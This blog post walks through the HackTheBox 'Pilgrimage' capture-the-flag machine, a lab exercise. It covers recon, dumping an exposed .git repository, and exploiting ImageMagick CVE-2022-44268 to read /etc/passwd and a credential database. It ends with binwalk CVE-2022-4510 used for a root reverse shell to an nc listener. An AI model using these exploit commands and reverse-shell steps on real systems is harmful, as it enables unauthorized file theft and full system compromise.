---
layout: post
title: HackTheBox Pilgrimage write up
---

# pilgrimage

# recon

examining the

I ran a simple nmap scan to find out port 22 and 80 are running on the machine

```jsx
$ nmap -v -oN ports -v 10.10.11.219
# Nmap 7.94 scan initiated Sat Jul  8 20:01:58 2023 as: nmap -v -oN ports -v 10.10.11.219
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up, received echo-reply ttl 63 (0.12s latency).
Scanned at 2023-07-08 20:01:58 +01 for 2s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jul  8 20:02:00 2023 -- 1 IP address (1 host up) scanned in 2.03 seconds
```

upon sending a request to port 80 and examining the response headers, we can see that the vhost of this machine is `pilgrimage.htb`

```bash
$ curl  -v 10.10.11.219
*   Trying 10.10.11.219:80...
* Connected to 10.10.11.219 (10.10.11.219) port 80
> GET / HTTP/1.1
> Host: 10.10.11.219
> User-Agent: curl/8.3.0
> Accept: */*
>
< HTTP/1.1 301 Moved Permanently
< Server: nginx/1.18.0
< Date: Sun, 26 Nov 2023 17:01:06 GMT
< Content-Type: text/html
< Content-Length: 169
< Connection: keep-alive
< Location: http://pilgrimage.htb/
<
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>
* Connection #0 to host 10.10.11.219 left intact
```

So I added the machine’s IP to my `/etc/hosts` as `pilgrimage.htb` then ran a detailed `nmap` scan on the open ports

```jsx
$ nmap -sC -sV pilgrimage.htb -p 22,80 -A -v
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up, received reset ttl 63 (0.11s latency).
Scanned at 2023-07-08 20:02:14 +01 for 27s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnPDlM1cNfnBOJE71gEOCGeNORg5gzOK/TpVSXgMLa6Ub/7KPb1hVggIf4My+cbJVk74fKabFVscFgDHtwPkohPaDU8XHdoO03vU8H04T7eqUGj/I2iqyIHXQoSC4o8Jf5ljiQi7CxWWG2t0n09CPMkwdqfEJma7BGmDtCQcmbm36QKmUv6Kho7/LgsPJGBP1kAOgUHFfYN1TEAV6TJ09OaCanDlV/fYiG+JT1BJwX5kqpnEAK012876UFfvkJeqPYXvM0+M9mB7XGzspcXX0HMbvHKXz2HXdCdGSH59Uzvjl0dM+itIDReptkGUn43QTCpf2xJlL4EeZKZCcs/gu8jkuxXpo9lFVkqgswF/zAcxfksjytMiJcILg4Ca1VVMBs66ZHi5KOz8QedYM2lcLXJGKi+7zl3i8+adGTUzYYEvMQVwjXG0mPkHHSldstWMGwjXqQsPoQTclEI7XpdlRdjS6S/WXHixTmvXGTBhNXtrETn/fBw4uhJx4dLxNSJeM=
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOaVAN4bg6zLU3rUMXOwsuYZ8yxLlkVTviJbdFijyp9fSTE6Dwm4e9pNI8MAWfPq0T0Za0pK0vX02ZjRcTgv3yg=
|   256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILGkCiJaVyn29/d2LSyMWelMlcrxKVZsCCgzm6JjcH1W
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
|_http-title: Pilgrimage - Shrink Your Images
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-git:
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

you can see that there is a forgotten `.git` directory on the web server, we can use `git-dumper` to download it on our system

```jsx
$ git-dumper git-dumper http://pilgrimage.htb/ .
...
$ ls
assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
$ file magick
magick: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9fdbc145689e0fb79cb7291203431012ae8e1911, stripped
(14:57:22) [ archiso@jeff | /tmp/lab ] (master)
$ ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5
```

after downloading it, it appears to have the source code the website, and a binary called `magic`, which upon inspecting it’s `imageMagic` version `7.1.0-49 beta`

upon inspecting the website, I found that it asks for a picture to shrink, probably using the found binary `magic` that we found before

![website.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/htb/pilgrimage/website.png)

now back to the `imagemagic` version, I found that Its vulnerable to **`CVE-2022-44268` ,** for that I used https://github.com/kljunowsky/CVE-2022-44268 to exploit it. the tool works by embedding a payload in normal picture, then examining the shrinked version of it that is given by the website

```jsx
$ python CVE-2022-44268.py --image ../the_council_decided_exile.jpg --file-to-read /etc/passwd  --output jeff.jpg
```

after uploading the picture you’re provided a link of the shrinked version

![shrinked.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/htb/pilgrimage/shrinked.png)

and when you pass the link to the tool, you can see the machine’s `/etc/passwd` which has an `emily` user

```jsx
$ python CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/64ad633d35af2.png
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

# Emily

when reading the source files in the git repo I found a database path on the server

```jsx
$ grep sqlite *.php
dashboard.php:  $db = new PDO('sqlite:/var/db/pilgrimage');
index.php:        $db = new PDO('sqlite:/var/db/pilgrimage');
login.php:  $db = new PDO('sqlite:/var/db/pilgrimage');
register.php:  $db = new PDO('sqlite:/var/db/pilgrimage');
```

so the next thing I did was to get it

```jsx
$ python CVE-2022-44268.py --image ../the_council_decided_exile.jpg --file-to-read /var/db/pilgrimage  --output jeff.jpg
[uploads the pic to the website]
$ python CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/64ad6461676f5.png
Traceback (most recent call last):
  File "/tmp/lab/CVE-2022-44268/CVE-2022-44268.py", line 48, in <module>
    main()
  File "/tmp/lab/CVE-2022-44268/CVE-2022-44268.py", line 17, in main
    decrypted_profile_type = bytes.fromhex(raw_profile_type_stipped).decode('utf-8')
                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
UnicodeDecodeError: 'utf-8' codec can't decode byte 0x91 in position 99: invalid start byte
```

it turned out the the tool can’t extract binary data, so I just added a `print` statement before the erroneous line to grab the hex then manually converted it with `xxd`

```jsx
$ python CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/64ad6461676f5.png
[lots of hex data which I put into a file called 'a']
$ xxd -r -p a > db
$ file db
db: SQLite 3.x database, last written using SQLite version 3034001, file counter 63, database pages 5, cookie 0x4, schema 4, UTF-8, version-valid-for 63
$ sqlite3
SQLite version 3.42.0 2023-05-16 12:36:15
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> .open db
sqlite> .tables
images  users
sqlite> select * from tables;
emily|[REDACTED PASSWORD]
sqlite>
```

then we log in to the box via ssh and get the flag

```jsx
$ ssh emily@pilgrimage.htb
emily@pilgrimage.htb's password:
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/\*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jul 11 23:39:20 2023 from 10.10.14.185
emily@pilgrimage:~$ ls
pspy64  user.txt
emily@pilgrimage:~$ cat user.txt
REDACTED
emily@pilgrimage:~$
```

# privilege escalation

when checking the running process on the system using `ps aux` I found one running as root that executes a bash script

```jsx
emily@pilgrimage:~$  ps aux
root         682  0.0  0.0   6816  2924 ?        Ss   Jul11   0:00 /bin/bash /usr/sbin/malwarescan.sh
emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done
emily@pilgrimage:~$
```

the script listen for file creating events under `/var/www/pilgrimage.htb/shrunk` , runs `binwalk` on them, then does other stuff that are irrelevant for us in this case

at first I went down the rabbit whole of trying bash injection, then I checked `binwalk` version just to find it vulnerable to https://www.exploit-db.com/exploits/51249

```jsx
emily@pilgrimage:~$ /usr/local/bin/binwalk

Binwalk v2.3.2
```

same scenario again, you just use the script to make a picture malicious, upload it to the box, and copy it to `/var/www/pilgrimage.htb/shrunk` and you’ll get a reverse shell as root

```jsx
### my machine
$ python CVE-2022-4510.py
...
usage: CVE-2022-4510.py [-h] file ip port

positional arguments:
  file        Path to input .png file
  ip          Ip to nc listener
  port        Port to nc listener

options:
  -h, --help  show this help message and exit 
$ python CVE-2022-4510.py the_council_decided_exile.jpg 10.10.14.119 10000

...

You can now rename and share binwalk_exploit and start your local netcat listener.

$ ls
binwalk_exploit.png  CVE-2022-4510.py  the_council_decided_exile.jpg
$ scp binwalk_exploit.png emily@pilgrimage.htb:/tmp
emily@pilgrimage.htb's password: 
binwalk_exploit.png                                              100%   68KB  41.6KB/s   00:01
$ nc -lnvp 10000

### htb machine
emily@pilgrimage:~$ ls /tmp/
binwalk_exploit.png
systemd-private-82c671d9f3154d60bd6496cae4bfdb5f-systemd-logind.service-eBKEJg
systemd-private-82c671d9f3154d60bd6496cae4bfdb5f-systemd-timesyncd.service-IzHsGf
vmware-root_606-2722828934
emily@pilgrimage:~$ cp /tmp/binwalk_exploit.png /var/www/pilgrimage.htb/shrunk
emily@pilgrimage:~$

### my machine

$ nc -lnvp 10000
Connection from 10.10.11.219:48518
python -c 'import pty;pty.spawn("/bin/bash")'
root@pilgrimage:~/quarantine# pwd
pwd
/root/quarantine
root@pilgrimage:~/quarantine# cd ..
cd ..
root@pilgrimage:~# ls
ls
quarantine  reset.sh  root.txt
root@pilgrimage:~# cat root.txt
cat root.txt
[REDACTED]
root@pilgrimage:~#
```
